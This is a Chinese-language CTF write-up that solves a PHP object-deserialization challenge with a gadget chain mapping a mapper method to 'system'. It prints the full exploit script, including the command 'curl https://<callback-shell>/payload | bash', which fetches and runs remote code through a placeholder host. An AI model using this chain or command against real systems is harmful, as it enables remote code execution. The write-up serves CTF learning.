# webweb

## 题目简述

题目核心是 PHP 对象反序列化链构造。可控对象图中存在 `CLI\Agent` 持有 `$server`、`DB\Mongo` 持有事件回调、`DB\Mongo\Mapper` 持有 `$collection/$document`，以及 `DB\SQL\Mapper` 中 `props["insertone"] = "system"` 这样的可调用映射。解法通过序列化对象数组触发链式调用，最终把 `insert` 映射到 `system`，执行命令。

## 解题过程

```plain
<?php
namespace CLI{
    class Agent
    {
        protected $server;
        public function __construct($server)
        {
            $this->server=$server;
        }
    }

    class WS
    {
    }
}
namespace DB{
    abstract class Cursor  implements \IteratorAggregate {}
    class Mongo {
        public $events;
        public function __construct($events)
        {
            $this->events=$events;
        }
    }
}

namespace DB\Mongo{
    class Mapper extends \DB\Cursor {
        protected $legacy=0;
        protected $collection;
        protected $document;
        function offsetExists($offset){}
        function offsetGet($offset){}
        function offsetSet($offset, $value){}
        function offsetUnset($offset){}
        function getIterator(){}
        public function __construct($collection,$document){
            $this->collection=$collection;
            $this->document=$document;
        }
    }
}
namespace DB\SQL{
    class Mapper extends \DB\Cursor{
        protected $props=["insertone"=>"system"];
        function offsetExists($offset){}
        function offsetGet($offset){}
        function offsetSet($offset, $value){}
        function offsetUnset($offset){}
        function getIterator(){}
    }
}

namespace{
$SQLMapper=new DB\SQL\Mapper();
$MongoMapper=new DB\Mongo\Mapper($SQLMapper,"curl https://<callback-shell>/payload | bash");
$DBMongo=new DB\Mongo(array('disconnect'=>array($MongoMapper,"insert")));
$Agent=new CLI\Agent($DBMongo);
$WS=new CLI\WS();
echo urlencode(serialize(array($WS,$Agent)));
}
```

## 方法总结

- 核心技巧：按目标类的属性可见性和构造关系伪造对象图，把事件回调和 mapper 方法映射串成命令执行。
- 识别信号：PHP 反序列化题中若出现 `events`、`disconnect`、`insert`、`props`、`IteratorAggregate` 等回调/映射结构，应检查是否能把业务方法名转成内置危险函数。
- 复用要点：WP 中保留最小可运行 gadget 构造即可，不应保留真实反连地址；命令位置用 `<callback-shell>` 这类占位说明。
